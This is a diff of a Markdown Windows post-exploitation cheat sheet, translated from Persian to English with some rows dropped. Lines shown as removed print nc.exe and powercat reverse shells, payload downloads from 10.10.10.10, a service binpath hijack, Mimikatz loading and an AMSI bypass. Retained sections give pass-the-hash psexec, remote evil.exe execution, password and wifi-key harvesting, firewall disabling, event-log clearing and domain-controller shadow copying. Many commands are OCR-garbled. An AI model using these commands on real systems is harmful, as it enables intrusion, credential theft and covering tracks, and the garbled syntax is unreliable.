@@ -1,18 +1,17 @@
 ---
 layout: default
-published: true
 ---
 
-# ویندوز
+# WINDOWS
 
-## نسخه ها
+## WINDOWS versions
 
 <table>
   <thead>
     <tr>
-      <th style="text-align:left"><b>شماره یا ID</b>
+      <th style="text-align:left"><b>ID</b>
       </th>
-      <th style="text-align:left"><b>نسخه ها</b>
+      <th style="text-align:left"><b>Version</b>
       </th>
     </tr>
   </thead>
@@ -65,27 +64,25 @@ published: true
         Windows Server 2012 (Foundation, Essentials, Standard)</td>
     </tr>
   </tbody>
-</table>
+</table>## WINDOWS files
 
-## فایل ها
-
-| **دستور** | **توضیح** |
+| **Command** | **Description** |
 | :--- | :--- |
-| %SYSTEMROOT% | معمولا C:\Windows |
-| %SYSTEMROOT%\System32\drivers\etc\hosts | موجودیت های DNS |
-| %SYSTEMROOT%\System32\drivers\etc\networks | تنظیمات شبکه |
-| %SYSTEMROOT%  system32  config\SAM | نام کاربری و هش کلمه عبور |
-| %SYSTEMROOT%\repair\SAM | کپی از SAM |
-| %SYSTEMROOT%\System32\config\RegBack\SAM | تهیه پشتیبان از کپی SAM |
-| %WINDIR%\system32\config\AppEvent.Evt | گزارشات برنامه ها |
-| %WINDIR%\system32\config\SecEvent.Evt | گزارشات امنیت |
-| %ALLUSERSPROFILE%\Start Menu\Programs\Startup\ | مسیر راه انداز |
-| %USERPROFILE%\Start Menu\Programs\Startup\ | مسیر راه انداز |
-| %SYSTEMROOT%\Prefetch | مسیر Prefetch \(EXE گزارشات\) |
+| %SYSTEMROOT% | Typically C:\Windows |
+| %SYSTEMROOT%\System32\drivers\etc\hosts | DNS entries |
+| %SYSTEMROOT%\System32\drivers\etc\networks | Network settings |
+| %SYSTEMROOT%  system32  config\SAM | User & password hashes |
+| %SYSTEMROOT%\repair\SAM | Backup copy of SAM |
+| %SYSTEMROOT%\System32\config\RegBack\SAM | Backup copy of SAM |
+| %WINDIR%\system32\config\AppEvent.Evt | Application Log |
+| %WINDIR%\system32\config\SecEvent.Evt | Security Log |
+| %ALLUSERSPROFILE%\Start Menu\Programs\Startup\ | Startup Location |
+| %USERPROFILE%\Start Menu\Programs\Startup\ | Startup Location |
+| %SYSTEMROOT%\Prefetch | Prefetch dir \(EXE logs\) |
 
-## مسیر های راه انداز
+## Startup Directories
 
-### برای WINDOWS NT 6.1,6.0
+### WINDOWS NT 6.1,6.0
 
 ```text
 # All users
@@ -94,155 +91,152 @@ published: true
 %SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
 ```
 
-### برای WINDOWS NT 5.2, 5.1, 5.0
+### WINDOWS NT 5.2, 5.1, 5.0
 
 ```text
 %SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup
 ```
 
-### برای WINDOWS 9x
+### WINDOWS 9x
 
 ```text
 %SystemDrive%\wmiOWS\Start Menu\Programs\Startup
 ```
 
-### برای WINDOWS NT 4. 0, 3. 51, 3. 50
+### WINDOWS NT 4. 0, 3. 51, 3. 50
 
 ```text
 %SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup
 ```
 
-## دستورات اطلاعات سیستم
+## WINDOWS system info commands
 
 
 
-| **دستور** | **توضیح** |
+| **Command** | **Description** |
 | :--- | :--- |
-| ver | نسخه سیستم عامل |
-| sc query state=all | نمایش سرویس ها |
-| tasklist /svc | نمایش فرآیند و سرویس ها |
-| tasklist /m | نمایش کلیه فرآیند ها و dll ها |
-| tasklist /S ip /v | فرآیند های در حال اجرا از راه دور |
-| taskkill /PID pid /F | حذف اجباری فرآیند |
-| systeminfo /S ip /U domain\user /P Pwd | دریافت اطلاعات سیستم از راه دور |
-| reg query \\ ip \ RegDomain \  Key /v VALUE | ارسال پرس و جو به رجیستری, /s=all values |
-| reg query HKLM /f password /t REG\_SZ /s | جست و جو رجیستری برای کلمه عبور ها |
-| fsutil fsinfo drives | لیست درایور ها •نیاز به دسترسی admin |
-| dir /a /s /b c:\'.pdf' | جست و جو برای کلیه فایل های pdf |
-| dir /a /b c:\windows\kb' | جست و جو برای patche ها |
-| findstr /si password' .txt I •.xmll •.xls | جست و جو در فایل های برای کلمه عبور ها |
-| tree /F /A c: tree.txt | لیست فولدر های درایو C: |
-| reg save HKLM\Security security.hive | ذخیره hive های امنیت درون فایل |
-| echo %USERNAME% | کاربر جاری |
-| whoami /priv | دسترسی های کاربر جاری |
+| ver | Get OS version |
+| sc query state=all | Show services |
+| tasklist /svc | Show processes & services |
+| tasklist /m | Show all processes & DLLs |
+| tasklist /S ip /v | Remote process listing |
+| taskkill /PID pid /F | Force process to terminate |
+| systeminfo /S ip /U domain\user /P Pwd | Remote system info |
+| reg query \\ ip \ RegDomain \  Key /v VALUE | Query remote registry, /s=all values |
+| reg query HKLM /f password /t REG\_SZ /s | Search registry for password |
+| fsutil fsinfo drives | List drives •must be admin |
+| dir /a /s /b c:\'.pdf' | Search for all PDFs |
+| dir /a /b c:\windows\kb' | Search for patches |
+| findstr /si password' .txt I •.xmll •.xls | Search files for password |
+| tree /F /A c: tree.txt | Directory listing of C: |
+| reg save HKLM\Security security.hive | Save security hive to file |
+| echo %USERNAME% | Current user |
 
-## دستور net/domain
+## WINDOWS net/domain commands
 
 
 
 <table>
   <thead>
     <tr>
-      <th style="text-align:left"><b>دستور</b>
+      <th style="text-align:left"><b>Command</b>
       </th>
-      <th style="text-align:left"><b>توضیح</b>
+      <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">net view /domain</td>
-      <td style="text-align:left">هاست هاری دامین جاری </td>
+      <td style="text-align:left">Hosts in current domain</td>
     </tr>
     <tr>
       <td style="text-align:left">net view /domain: [MYDOMAIN]</td>
-      <td style="text-align:left">هاست های در [MYDOMAIN]</td>
+      <td style="text-align:left">Hosts in [MYDOMAIN]</td>
     </tr>
     <tr>
       <td style="text-align:left">net user /domain</td>
-      <td style="text-align:left">کلیه کاربران دامین جاری</td>
+      <td style="text-align:left">All users in current domain</td>
     </tr>
     <tr>
       <td style="text-align:left">net user user pass /add</td>
-      <td style="text-align:left">اضافه نموده کاربر</td>
+      <td style="text-align:left">Add user</td>
     </tr>
     <tr>
       <td style="text-align:left">net localgroup &quot;Administrators&quot; user /add</td>
-      <td style="text-align:left">اضافه نموده کاربر به Administrator ها</td>
+      <td style="text-align:left">Add user to Administrators</td>
     </tr>
     <tr>
       <td style="text-align:left">net accounts /domain</td>
-      <td style="text-align:left">سیاست های کلمه عبور دامین</td>
+      <td style="text-align:left">Domain password policy</td>
     </tr>
     <tr>
       <td style="text-align:left">net localgroup &quot;Administrators&quot;</td>
-      <td style="text-align:left">لیست Admin های محلی</td>
+      <td style="text-align:left">List local Admins</td>
     </tr>
     <tr>
       <td style="text-align:left">net group /domain</td>
-      <td style="text-align:left">لیست گروه های دامنه</td>
+      <td style="text-align:left">List domain groups</td>
     </tr>
     <tr>
       <td style="text-align:left">net group &quot;Domain Admins&quot; /domain</td>
-      <td style="text-align:left">لیست کاربران Admin در دامین</td>
+      <td style="text-align:left">List users in Domain Admins</td>
     </tr>
     <tr>
       <td style="text-align:left">net group &quot;Domain Controllers&quot; /domain</td>
-      <td style="text-align:left">لیست DC ها برای دامین جاری</td>
+      <td style="text-align:left">List DCs for current domain</td>
     </tr>
     <tr>
       <td style="text-align:left">net share</td>
-      <td style="text-align:left">محیط اشتراکی SMB</td>
+      <td style="text-align:left">Current SMB shares</td>
     </tr>
     <tr>
       <td style="text-align:left">net session I find I &quot;\&quot;</td>
-      <td style="text-align:left">لیست نشست های فعال SMB</td>
+      <td style="text-align:left">Active SHB sessions</td>
     </tr>
     <tr>
       <td style="text-align:left">net user user /ACTIVE:yes /domain</td>
-      <td style="text-align:left">گشودن دامین دامین</td>
+      <td style="text-align:left">Unlock domain user account</td>
     </tr>
     <tr>
       <td style="text-align:left">net user user &apos;&apos; newpassword &apos;&apos; /domain</td>
-      <td style="text-align:left">تغییر نام کاربری و کلمه عبور دامین</td>
+      <td style="text-align:left">Change domain user password</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>net share share c:\share</p>
         <p>/GRANT:Everyone,FULL</p>
       </td>
-      <td style="text-align:left">فولدر به اشتراک گذاشته شده</td>
+      <td style="text-align:left">Share folder</td>
     </tr>
   </tbody>
-</table>
-
-## دستورات از راه دور
+</table>## WINDOWS remote commands
 
 <table>
   <thead>
     <tr>
-      <th style="text-align:left"><b>دستور</b>
+      <th style="text-align:left"><b>Command</b>
       </th>
-      <th style="text-align:left"><b>توضیح</b>
+      <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">tasklist /S ip /v</td>
-      <td style="text-align:left">فرآیند های در حال اجرا در ip</td>
+      <td style="text-align:left">Remote process listing</td>
     </tr>
     <tr>
       <td style="text-align:left">systeminfo /S ip /U domain\user /P Pwd</td>
-      <td style="text-align:left">اطلاعات مربوط به ip</td>
+      <td style="text-align:left">Remote systeminfo</td>
     </tr>
     <tr>
       <td style="text-align:left">net share \\ ip</td>
-      <td style="text-align:left">محیط اشتراکی ip</td>
+      <td style="text-align:left">Shares of remote computer</td>
     </tr>
     <tr>
       <td style="text-align:left">net use \\ ip</td>
-      <td style="text-align:left">فایل سیستم ip</td>
+      <td style="text-align:left">Remote filesystem (IPC$)</td>
     </tr>
     <tr>
       <td style="text-align:left">
@@ -256,7 +250,7 @@ published: true
     </tr>
     <tr>
       <td style="text-align:left">reg add \\ ip \ regkey \ value</td>
-      <td style="text-align:left">اضافه نموده کلید رجیستری برای ip</td>
+      <td style="text-align:left">Add registry key remotely</td>
     </tr>
     <tr>
       <td style="text-align:left">
@@ -268,230 +262,198 @@ published: true
         <p>(space after start=)</p>
       </td>
     </tr>
-     <tr>
-      <td style="text-align:left">cmd.exe /c certutil -urlcache -split -f http://ip/nc.exe c:/windows/temp/nc.exe</td>
-      <td style="text-align:left">کپی فایل از ip به سیستم جاری توسط cmd.exe</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">cmd.exe /c c:/windows/temp/nc.exe ip port -e cmd.exe</td>
-      <td style="text-align:left">شل reverse</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">nc.exe -lvvp port</td>
-      <td style="text-align:left">گوش دادن به port خاص </td>
-    </tr>
-    <tr>
-      <td style="text-align:left">python3 -m http.server port</td>
-      <td style="text-align:left">ایجاد وبسرور</td>
-    </tr>
     <tr>
       <td style="text-align:left">xcopy /s \\ ip \dir C:\local</td>
-      <td style="text-align:left">کپی از فودر ip</td>
+      <td style="text-align:left">Copy remote folder</td>
     </tr>
     <tr>
       <td style="text-align:left">shutdown /m \\ ip /r /t 0 /f</td>
-      <td style="text-align:left">راه اندازی مجدد سیستم با ip</td>
+      <td style="text-align:left">Remotely reboot machine</td>
     </tr>
   </tbody>
-</table>
-
-## دستورات شبکه
+</table>## WINDOWS network commands
 
 <table>
   <thead>
     <tr>
-      <th style="text-align:left"><b>دستور</b>
+      <th style="text-align:left"><b>Command</b>
       </th>
-      <th style="text-align:left"><b>توضیح</b>
+      <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">ipconfig I all</td>
-      <td style="text-align:left">تنظیمات ip</td>
+      <td style="text-align:left">IP configuration</td>
     </tr>
     <tr>
       <td style="text-align:left">ipconfig /displaydns</td>
-      <td style="text-align:left">حافظه نهان DNS</td>
+      <td style="text-align:left">Local DNS cache</td>
     </tr>
     <tr>
       <td style="text-align:left">netstat -ana</td>
-      <td style="text-align:left">بازنمودن ارتباط</td>
+      <td style="text-align:left">Open connections</td>
     </tr>
     <tr>
       <td style="text-align:left">netstat -anop tcp 1</td>
-      <td style="text-align:left">ایجاد Netstat loop</td>
+      <td style="text-align:left">Netstat loop</td>
     </tr>
     <tr>
       <td style="text-align:left">netstat -ani findstr LISTENING</td>
-      <td style="text-align:left">پورت های در حال استفاده</td>
+      <td style="text-align:left">LISTENING ports</td>
     </tr>
     <tr>
       <td style="text-align:left">route print</td>
-      <td style="text-align:left">جداول Route</td>
+      <td style="text-align:left">Routing table</td>
     </tr>
     <tr>
       <td style="text-align:left">arp -a</td>
-      <td style="text-align:left">دریافت MAC های سیستم (با استفاده از جدول ARP)</td>
+      <td style="text-align:left">Known MACs (ARP table)</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>nslookup, set type=any, ls -d domain</p>
         <p>results.txt, exit</p>
       </td>
-      <td style="text-align:left">دریافت DNS Zone Xfer</td>
+      <td style="text-align:left">DNS Zone Xfer</td>
     </tr>
     <tr>
       <td style="text-align:left">nslookup -type=SRV _www._tcp.url.com</td>
-      <td style="text-align:left">دریافت Domain SRV lookup ( ldap, kerberos, sip)</td>
+      <td style="text-align:left">Domain SRV lookup ( ldap, kerberos, sip)</td>
     </tr>
     <tr>
       <td style="text-align:left">tftp -I ip GET remotefile</td>
-      <td style="text-align:left">انتقال فایل در TFTP</td>
+      <td style="text-align:left">TFTP file transfer</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh wlan show profiles</td>
-      <td style="text-align:left">پروفایل های ذخیره شده در شبکه بی سیم</td>
+      <td style="text-align:left">Saved wireless profiles</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh firewall set opmode disable</td>
-      <td style="text-align:left">غیر فعال سازی فایروال (&apos;Old)</td>
+      <td style="text-align:left">Disable firewall (&apos;Old)</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh wlan export profile folder=. key=clear</td>
-      <td style="text-align:left">استخراج wifi به صورت plaintext</td>
+      <td style="text-align:left">Export wifi plaintext pwd</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh interface ip show interfaces</td>
-      <td style="text-align:left">لیست IDs/MTUs مربوط به interface ها</td>
+      <td style="text-align:left">List interface IDs/MTUs</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>netsh interface ip set address local static</p>
         <p>ip nmask gw ID</p>
       </td>
-      <td style="text-align:left">تنظیم IP</td>
+      <td style="text-align:left">Set IP</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh interface ip set dns local static ip</td>
-      <td style="text-align:left">تنظیم سرور DNS</td>
+      <td style="text-align:left">Set DNS server</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh interface ip set address local dhcp</td>
-      <td style="text-align:left">تنظیم interface برای استفاده از DHCP</td>
+      <td style="text-align:left">Set interface to use DHCP</td>
     </tr>
   </tbody>
-</table>
-
-## دستورات کاربردی
+</table>## WINDOWS utility commands
 
 
 
 <table>
   <thead>
     <tr>
-      <th style="text-align:left"><b>دستور</b>
+      <th style="text-align:left"><b>Command</b>
       </th>
-      <th style="text-align:left"><b>توضیح</b>
+      <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">type file</td>
-      <td style="text-align:left">نمایش محتویات فایل</td>
+      <td style="text-align:left">Display file contents</td>
     </tr>
     <tr>
       <td style="text-align:left">del path \&apos; .&#x2022; /a /s /q /f</td>
-      <td style="text-align:left">حذف فایل های در مسیر جاری</td>
+      <td style="text-align:left">Forceably delete all files in path</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>find /I &apos;&apos;str&apos;&apos; filename</p>
         <p>command I find /c /v &quot;&quot;</p>
       </td>
-      <td style="text-align:left">لیست خروجی های cmd</td>
+      <td style="text-align:left">Line count of cmd output</td>
     </tr>
     <tr>
       <td style="text-align:left">at HH:MM file [args] (i.e. at 14:45 cmd /c)</td>
-      <td style="text-align:left">زمان بندی اجرایی فایل</td>
+      <td style="text-align:left">Schedule file to run</td>
     </tr>
     <tr>
       <td style="text-align:left">runas /user: user &quot; file [args]&quot;</td>
-      <td style="text-align:left">اجرای فایل با کاربر خاص</td>
+      <td style="text-align:left">Run file as user</td>
     </tr>
     <tr>
       <td style="text-align:left">restart /r /t 0</td>
-      <td style="text-align:left">راه اندازی مجدد</td>
+      <td style="text-align:left">Restart now</td>
     </tr>
     <tr>
-      <td style="text-align:left">sc stop UsoSvc</td>
-      <td style="text-align:left">توقف سرویس UsoSvc</td>
-    </tr> 
-    <tr>
-      <td style="text-align:left">sc start UsoSvc</td>
-      <td style="text-align:left">راه اندازی سرویس UsoSvc</td>
-    </tr> 
-    <tr>
-      <td style="text-align:left">sc config UsoSvc binpath="c:\windows\temp\nc.exe ip port -e C:\windows\system32\cmd.exe"       </td>
-      <td style="text-align:left">تغییر مسیر فایل اجرایی توسط UsoSvc</td>
-    </tr> 
-    <tr>
       <td style="text-align:left">tr -d &apos;\15\32&apos; win.txt unix.txt</td>
-      <td style="text-align:left">حذف CR &amp; &apos;Z (&apos;nix)</td>
+      <td style="text-align:left">Removes CR &amp; &apos;Z (&apos;nix)</td>
     </tr>
     <tr>
       <td style="text-align:left">makecab file</td>
-      <td style="text-align:left">فشرده سازی</td>
+      <td style="text-align:left">Native compression</td>
     </tr>
     <tr>
       <td style="text-align:left">Wusa.exe /uninstall /kb: ###</td>
-      <td style="text-align:left">حذف patch</td>
+      <td style="text-align:left">Uninstall patch</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>cmd.exe &quot;wevtutil qe Application /c:40</p>
         <p>/f:text /rd:true&quot;</p>
       </td>
-      <td style="text-align:left">استفاده از Event Viewer در CLI</td>
+      <td style="text-align:left">CLI Event Viewer</td>
     </tr>
     <tr>
       <td style="text-align:left">lusrrngr.msc</td>
-      <td style="text-align:left">استفاده از Local user manager</td>
+      <td style="text-align:left">Local user manager</td>
     </tr>
     <tr>
       <td style="text-align:left">services.msc</td>
-      <td style="text-align:left">استفاده از Services control panel</td>
+      <td style="text-align:left">Services control panel</td>
     </tr>
     <tr>
       <td style="text-align:left">taskmgr.exe</td>
-      <td style="text-align:left">استفاده از Task manager</td>
+      <td style="text-align:left">Task manager</td>
     </tr>
     <tr>
       <td style="text-align:left">secpool.rnsc</td>
-      <td style="text-align:left">استفاده از Security policy manager</td>
+      <td style="text-align:left">Security policy manager</td>
     </tr>
     <tr>
       <td style="text-align:left">eventvwr.rnsc</td>
-      <td style="text-align:left">استفاده از Event viewer</td>
+      <td style="text-align:left">Event viewer</td>
     </tr>
   </tbody>
 </table>## MISC. commands
 
-### قفل نمودن workstation
+### Lock workstation
 
 ```text
 rundll32.dll user32.dll LockWorkstation 
 ```
 
-### غیر فعال سازی فایروال ویندوز
+### Disable windows firewall
 
 ```text
 netsh advfirewall set currentprofile state off netsh advfirewall set allprofiles state off 
 ```
 
-### ایجاد port forward \(\*نیاز به دسترسی admin\)
+### Native windows port forward \(\* must be admin\)
 
 ```text
 netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2 
@@ -499,35 +461,35 @@ netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l conne
 netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=l.l.l.l 
 ```
 
-### فعال سازی cmd
+### Re-enable command prompt
 
 ```text
 reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /t REG DWORD /d 0 /f 
 ```
 
-## دستور PSEXEC
+## PSEXEC
 
-### اجرای فایل از راه دور با اطلاعات هویتی خاص
+### Execute file hosted on remote system with specified credentials
 
 ```text
 psexec /accepteula \\ targetiP -u domain\user -p password -c -f \\ smbiP \share\file.exe 
 ```
 
-### اجرای دستور با هش خاص
+### Run remote command with specified hash
 
 ```text
 psexec /accepteula \\ ip -u Domain\user -p Lt1 c:\Progra-1 
 ```
 
-### اجرا دستور بر روی سیستم از راه دور
+### Run remote command as system
 
 ```text
 psexec /accepteula \\ ip -s cmd.exe 
 ```
 
-## سرویس Terminal \(RDP\)
+## Terminal services \(RDP\)
 
-### شروع RDP
+### Start RDP
 
 ```text
 Create regfile.reg file with following line in it: HKEY LOCAL t1ACHINE\SYSTEH\CurrentControlSet \Control\ TerminalService 
@@ -541,13 +503,13 @@ net start terrnservice
 reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control \Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
 
-### تونل RDP از پورت 443 \(نیاز به راه اندازی مجدد سرویس terminal\)
+### Tunnel RDP out port 443 \(may need to restart terminal services\)
 
 ```text
 REG ADD "HKLt1\System\CurrentControlSet\Control \Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f 
 ```
 
-### حذف احراز هویت شبکه با اضافه نمودن exception در فایروال
+### Disable network level authentication, add firewall exception
 
 ```text
 reg add "HKEY LOCAL t1ACHINE\SYSTEt1\CurentControlSet\Control \Terminal
@@ -556,75 +518,69 @@ Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
 netsh firewall set service type = remotedesktop mode = enable 
 ```
 
-### وارد نمودن task از فایل XML
+### Import a schedule task from an "exported task" XML
 
 ```text
 schtasks.exe /create /tn t1yTask /xml "C:\MyTask.xml" /f
 ```
 
-## دستور WMIC
+## WMIC
 
 <table>
   <thead>
     <tr>
-      <th style="text-align:left"><b>دستور</b>
+      <th style="text-align:left"><b>Command</b>
       </th>
-      <th style="text-align:left"><b>توضیح</b>
+      <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">wmic [alias] get /?</td>
-      <td style="text-align:left">لیست کلیه ویژگی ها</td>
+      <td style="text-align:left">List all attributes</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic [alias] call /?</td>
-      <td style="text-align:left">متد Callable</td>
+      <td style="text-align:left">Callable methods</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic process list full</td>
-      <td style="text-align:left">ویژگی های فرآیند ها</td>
+      <td style="text-align:left">Process attributes</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic startupwmic service</td>
-      <td style="text-align:left">شروع سرویس wmic</td>
+      <td style="text-align:left">Starts wmic service</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic ntdomain list</td>
-      <td style="text-align:left">اطلاعات دامین و DC</td>
+      <td style="text-align:left">Domain and DC info</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic qfe</td>
-      <td style="text-align:left">لیست کلیه patches</td>
+      <td style="text-align:left">List all patches</td>
     </tr>
     <tr>
       <td style="text-align:left">wrnic process call create &quot;process_name&quot;</td>
-      <td style="text-align:left">اجرای فرآیند</td>
+      <td style="text-align:left">Execute process</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>wmic process where name=&quot;process&quot; call</p>
         <p>terminate</p>
       </td>
-      <td style="text-align:left">حذف فرآیند</td>
+      <td style="text-align:left">Terminate process</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic logicaldisk get description,name</td>
-      <td style="text-align:left">نمایش محیط اشتراکی منطقی</td>
+      <td style="text-align:left">View logical shares</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic cpu get DataWidth /format:list</td>
-      <td style="text-align:left">نمایش نسخه 32 بیتی یا 64 بیتی سیستم</td>
-    </tr>
-   <tr>
-      <td style="text-align:left">wmic service where started = true get name, startname</td>
-      <td style="text-align:left">نمایش سرویس های اجرا شده</td>
+      <td style="text-align:left">Display 32 I I 64 bit</td>
     </tr>
   </tbody>
-</table>
-
-### WMIC \[alias\] \[where\] \[clause\]
+</table>### WMIC \[alias\] \[where\] \[clause\]
 
 ```text
 [alias] == process, share, startup, service, nicconfig, useraccount, etc. 
@@ -632,52 +588,52 @@ schtasks.exe /create /tn t1yTask /xml "C:\MyTask.xml" /f
 [clause] ==list [fulllbrief], get [attribl, attrib2], call [method], delete
 ```
 
-### اجرا فایل در smb با اطلاعات هویتی خاص
+### Execute file hosted over smb on remote system with specified credentials
 
 ```text
 wmic /node: targetiP /user:domain\user /password:password process call create "\ \ smbiP \share\evil.exe" 
 ```
 
-### حذف نرم افزار
+### Uninstall software
 
 ```text
 wmic product get name /value # Get software names 
 wmic product where name="XXX" call uninstall /nointeractive 
 ```
 
-###  دسترسی به کاربر از راه دور
+### Remotely determine logged in user
 
 ```text
 wmic /node:remotecomputer computersystern get username 
 ```
 
-### نمایش فرآیند ها به صورت لحظه ای
+### Remotely process listing every second
 
 ```text
 wmic /node:machinename process list brief /every:l 
 ```
 
-### شروع RDP
+### Remotely start RDP
 
 ```text
 wmic /node:"machinename 4" path Win32_TerminalServiceSetting where 
 AllowTSConnections=''O'' call SetAllowTSConnections ''1''
 ```
 
-### لیست زمان هایی که کاربر وارد شده
+### List number of times user has logged on
 
 ```text
 wmic netlogin where (name like "%adm%") get numberoflogons 
 ```
 
-### جست و جو سرویس ها برای مسیر های unquoted
+### Search for services with unquoted paths on binary
 
 ```text
 wmic service get narne,displayname,pathnarne,startrnode 
 | findstr /i nauton | findstr /i /v "C:\windows\\" | findstr /i /v """
 ```
 
-### کپی از Volume shadow
+### Volume shadow copy
 
 ```text
 1. wmic /node: DC IP /user:"DOI1AIN\user" /password:"PASS" process 
@@ -703,118 +659,65 @@ Step by step instructions on room362.com for step below
    c. libesedb - http://code.google.com/p/libesedb/ 
 ```
 
-## محیط POWERSHELL
+## POWERSHELL
 
 | **Command** | **Description** |
 | :--- | :--- |
-| stop-transcript | توقف ضبط |
-| get-content file | نمایش محتویات فایل |
-| get-help command -examples | نمایش نمونه دستور |
-| get-command  'string' | جست و جو برای cmd |
-| get-service | نمایش سرویس ها \(stopservice, start-service\) |
-| get-wmiobject -class win32 service |نمایش سرویس ها به همان اطلاعات هویتی |
-| $PSVesionTable | نمایش نسخه powershell |
-| powershell.exe -version 2.0 |اجرای powershell 2.0 از نسخه 3.0 |
-| get-service measure-object | اطلاعات برگشت داده شده از سرویس |
-| get-psdrive | لیست برگشت داده شده از PSDrives |
-| get-process select -expandproperty name |نمایش نام ها |
-| get-help ' -parameter credential | دریافت اطلاعات هویتی |
-| get-wmiobject -list -'network' | WMI موجود در شبکه |
-| \(Net.DNS\]: :GetnostEntry\(" ip "I | فرآیند DNS Lookup |
-| powershell.exe wget "http://10.10.10.10/nc.exe" -outfile "c:\temp\nc.exe" | دریافت و ذخیره سازی فایل |
-| poweshell.exe -c "IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/powercat.ps1'); powercat -c 10.10.10.100 -p 4444 -e cmd | شل معکوس |
-| https://gist.githubusercontent.com/zhilich/b8480f1d22f9b15d4fdde07ddc6fa4ed/raw/8078a51bbfa18df36d8e890fefe96a06891dd47d/SimpleHttpServer.ps1 | وبسرور با پورت ۸۰۵۰ |
-| https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 | استفاده از mimikatz |
-| فراخوانی فایل های ps1 | Import-Module .\Invoke-Mimikatz.ps1 |
-| دریافت و ذخیره سازی فایل | iwr -uri http://10.10.10.10/file -o file.exe |
+| stop-transcript | stop recording |
+| get-content file | displays file contents |
+| get-help command -examples | Shows examples of command |
+| get-command  'string' | Searches for cmd string |
+| get-service | Displajs services \(stopservice, start-service\) |
+| get-wmiobject -class win32 service | Displays services, but takes alternate credentials |
+| $PSVesionTable | DisplaJ powershell version |
+| powershell.exe -version 2.0 | Run powershell 2.0 from 3.0 |
+| get-service measure-object | Returns \# of services |
+| get-psdrive | Returns list of PSDrives |
+| get-process select -expandproperty name | Returns only names |
+| get-help ' -parameter credential | Cmdlets that take creds |
+| get-wmiobject -list -'network' | Available WMI network cmds |
+| \(Net.DNS\]: :GetnostEntry\(" ip "I | DNS Lookup |
 
-
-### دورزدن AMSI
-
-```text
-Import-Module .\Invoke-Obfuscation\Invoke-Obfuscation.psm1
-Out-ObfuscatedTokenCommand -Path .\powerview.ps1 | Out-File out
-```
-
-یا
-
-```text
-https://raw.githubusercontent.com/kmkz/Pentesting/master/AMSI-Bypass.ps1
-. .\AMSI-Bypass.ps1
-Invoke-AmsiBypass
-```
-
-### غیرفعال سازی realtimemonitoring
-
-```text
-powershell -command set-mpppreference -Disable realtimemonitoring $true
-```
-
-### لیست تمامی کاربران
-
-```text
-$users = New-Object DirectoryServices.DirectorySearcher
-$users.Filter = "(&(objectclass=user))"
-$users.SearchRoot = ''
-$users.FindAll()
-```
-
-### لیست تمامی domain ها
-
-```text
-$computers = New-Object DirectoryServices.DirectorySearcher
-$computers.Filter = "(&(objectclass=computer))"
-$computers.SearchRoot = ''
-$computers.FindAll()
-```
-
-
-### دریافت اطلاعات هویتی AD با استفاده از doesnotrequirepreauth
-
-```text
-Set-ADAccountControl -identity jorden -doesnotrequirepreauth 1
-```
-
-### حذف گزارشات امنیت و برنامه ها\(برای SVR01\)
+### Clear security & application event log for remote server\(SVR01\)
 
 ```text
 Get-EventLog -list 
 Clear-EventLog -logname Application, Security -computername SVR01 
 ```
 
-### استخراج نسخه سیستم عامل در درون فایل CSV
+### Export OS info into CSV file
 
 ```text
 Get-WmiObject -class win32 operatingsystem | select -property ' | 
 export-csv c:\os.txt
 ```
 
-### لیست سرویس های در حال اجرا
+### List running services
 
 ```text
 Get-Service | where_object {$_.status -eq "Running"} 
 ```
 
-### استفاده از psdrive برای اشتراگ گذاری دائم
+### Persistent psdrive to remote file share
 
 ```text
 New-PSJrive -Persist -PSProvider FileSjstem -Root \\1.1.1.1\tools -Name i 
 ```
 
-### فایل های نوشته شده در تاریخ 8/20
+### Return files with write data past 8/20
 
 ```text
 Get-Childitem -Path c:\ -Force -Rec~rse -Filter '.log -ErrorAction
 SilentlyContinue | where {$_.LastWriteTime -gt "2012-08-20"} 
 ```
 
-### دریافت فایل از http
+### File download over http
 
 ```text
 (new-object sjstem.net.webclient) .downloadFile(''url'',''dest'') 
 ```
 
-### اتصالات پورت tcp\(پویشگر\)
+### TCP port connection\(scanner\)
 
 ```text
